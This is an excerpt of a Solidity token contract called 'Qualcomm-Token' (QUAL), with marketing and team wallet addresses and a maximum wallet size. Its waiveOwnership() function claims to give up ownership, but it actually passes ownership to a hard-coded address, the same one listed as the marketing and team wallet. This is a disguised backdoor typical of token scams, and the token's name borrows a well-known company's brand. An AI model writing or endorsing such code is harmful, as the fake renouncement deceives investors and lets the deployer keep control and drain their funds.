...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x58F9C9872E9F89E1125353CCC461168a0C153DaF);
    }
...
contract QUALCOMMTOKEN is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Qualcomm-Token";
    string private _symbol = "QUAL";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x58F9C9872E9F89E1125353CCC461168a0C153DaF);
    address payable public teamWalletAddress = payable(0x58F9C9872E9F89E1125353CCC461168a0C153DaF);
    ...
    uint256 public _walletMax =     14000000 * 10**_decimals;      
